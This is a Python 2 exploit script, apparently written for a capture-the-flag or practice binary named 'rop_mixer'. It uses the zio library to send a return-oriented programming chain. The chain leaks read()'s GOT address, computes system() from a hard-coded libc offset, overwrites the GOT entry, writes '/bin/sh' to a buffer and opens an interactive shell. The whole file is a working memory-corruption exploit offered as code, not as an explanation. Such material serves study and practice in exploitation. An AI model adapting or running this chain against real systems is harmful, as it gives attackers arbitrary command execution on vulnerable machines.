#!/usr/bin/env python
# coding: utf-8

from zio import *
from struct import pack, unpack
import os
import time

cmd = '/bin/sh\x00'

pppr = 0x804890d
ppr = pppr + 1
pr = ppr + 1
read_plt = 0x8048470
read_got = 0x804a004
write_plt = 0x8048500
buf = 0x804a34c

system_addr = 0xf7602e80
read_addr = 0xf76a2d80
system_read_diff = system_addr - read_addr

target = './rop_mixer'
os.system('rm core')
io = zio(target, print_write=False, print_read=COLORED(REPR, 'red'), timeout=9999999)

rop_chain = [
            # system()
            buf,
            0x44444444,
            read_plt,

            # read() overwrite the addr in read_got
            4,
            read_got,
            0,
            pppr,
            read_plt,

            # write() get the addr in read_got
            4,
            read_got,
            1,
            pppr,
            write_plt,

            # read() put the cmd in buffer
            len(cmd),
            buf,
            0,
            pppr,
            read_plt
        ]
payload = ''.join([pack('<I', item) for item in rop_chain[::-1]])

io.read_until_timeout(timeout=1)
io.write(payload)
io.write(cmd)

this_read_addr = unpack('<I', io.read(4))[0]
this_system_addr = this_read_addr + system_read_diff
print '[+] system : 0x%08x' % this_system_addr

io.write(pack('<I', this_system_addr))

io.interact()
